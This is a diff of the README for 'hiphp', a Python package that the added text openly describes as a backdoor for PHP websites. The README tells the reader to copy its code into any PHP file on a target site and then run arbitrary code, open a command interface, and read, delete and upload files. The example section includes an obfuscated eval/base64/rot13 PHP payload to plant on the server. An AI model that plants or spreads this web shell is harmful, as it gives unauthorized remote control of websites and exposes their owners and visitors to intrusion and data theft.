@@ -2,27 +2,51 @@
 <p align="center"><img align="center" src="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/screenshot/screenshot.png"></p>
 <h1>hiphp for control php websites.</h1>
 
-<p>A package for controlling a php-based website.</p>
+<p>backdoor control php sites, The site is controlled by sending commands, files and codes to the site using the http or https protocol. After copying the code and placing it in any php file on the target website, you will have permissions to enter it, read all files, delete and even upload new files to it. Also, this backdoor is password protected and non-reverse encryption.</p>
 
 <h2>Installation:</h2>
 
 ```
-pip install hiphp==0.1.11
+pip install hiphp==0.1.13
 ```
 
 <h2>Usage:</h2>
 
 ```python
+#call the package:
 from hiphp import hiphp
-p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False) #In order to print the result directly.
-#p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>") #In order to make the result as a variable.
-print(p1.get_code()) #Get HIPHP ID for first use.
-p1.run("<YOUR_CODE>") #Run a code or line in your website.
-p1.run_file("<PHP_CODE_FILE_PATH>") #Run a code or line in your website from a file.
-p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>") #Run a code or line in your website from a file With the entry of variables.
-p1.cli() #open command panel
-p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>") #Upload a file to the server hosting the site.
-p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>")
+#
+#
+#In order to print the result directly.
+p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>",False)
+#
+#In order to make the result as a variable.
+#p1=hiphp("<PASSWORD>","<http://THE/LINK/TO/THE/PHP/FILE/THAT/CONTAINS/THE/HIPHP/ID>")
+#
+#
+#Get HIPHP ID for first use.
+print(p1.get_code())
+#
+#
+#Run a code or line in your website.
+p1.run("<YOUR_CODE>")
+#
+#Run a code or line in your website from a file.
+p1.run_file("<PHP_CODE_FILE_PATH>")
+#
+#Run a code or line in your website from a file With the entry of variables.
+p1.run_file("<PHP_CODE_FILE_PATH>","<__VALUE_NAME__>==<VALUE_CONTENT>")
+#
+#
+#open command line interface.
+p1.cli()
+#
+#
+#Upload a file to the server hosting the site.
+p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>")
+#
+#Upload a file to a specific folder in the server hosting the site.
+p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOAD_THE_FILE_TO>") 
 
 ```
 
@@ -30,7 +54,12 @@ p1.upload("<THE_PATH_OF_THE_FILE_TO_BE_UPLOADED>","./<THE_PATH_YOU_WANT_TO_UPLOA
 
 ```python
 from hiphp import hiphp
+#
+#
 p1=hiphp("123","http://localhost/index.php",False)
+#
+#
+#
 # Example:1
 # GET ID:
 print(p1.get_code())
@@ -42,6 +71,9 @@ eval(str_rot13(base64_decode(str_rot13(base64_decode('bkpMYldTOUdFSVdKRUlXb1cwdU
 '''
 # Copy this code into the file whose path you entered earlier.
 # for example: https://localhost/index.php
+#
+#
+#
 # Example:2
 # Command:
 p1.run("echo 'this is a test';")
@@ -49,6 +81,9 @@ p1.run("echo 'this is a test';")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:3
 # Run code from file:
 #-example_3.php content:
@@ -66,6 +101,9 @@ p1.run_file("example_3.php")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:4
 # Run code from file With the entry of variables:
 #-example_4.php content:
@@ -83,6 +121,9 @@ p1.run_file("example_4.php","test==this is a test")
 '''
 this is a test
 '''
+#
+#
+#
 # Example:5
 # Command line interface:
 p1.cli()
@@ -90,9 +131,15 @@ p1.cli()
 '''
 hiphp>>>
 '''
+#
+#
+#
 # Example:6
 # Upload a picture:
 p1.upload("picture_example.png")
+#
+#
+#
 # Example:7
 # Upload a picture to a specific path:
 p1.upload("picture_example.png","./pictures/")
@@ -102,44 +149,56 @@ p1.upload("picture_example.png","./pictures/")
 <h2>Changelog:</h2>
 
 ```
+#
+## 0.1.13
+ - safety upgrade.
+ - Bug fixes & performance improvements.
+#
+## 0.1.12
+ - safety upgrade.
+ - Bug fixes & performance improvements.
+#
 ## 0.1.11
  - Command interface update.
  - Bug fixes & performance improvements.
+#
 ## 0.1.10
  - Fix Bugs.
+#
 ## 0.1.9
  - fix bugs.
- 
+#
 ## 0.1.7
  - fix bugs.
- 
+#
 ## 0.1.6
  - fix bugs.
  - add upload to upload any file.
  - Simplify the use of the program.
- 
+#
 ## 0.1.5
  - fix bugs.
+#
 ## 0.1.4
  - fix bugs.
  - new build.
- 
+#
 ## 0.1.1
  - Import pakages by pipincluder.
  - Fix bugs.
- 
+#
 ## 0.1.0
  - New build.
  - Fix bugs.
- 
+#
 ## 0.0.4
  - Fix bugs.
- 
+#
 ## 0.0.2
  - Fix bugs.
  - Add help list.
  - Add Executing from files.
- 
+#
 ## 0.0.1
  - First public release.
 
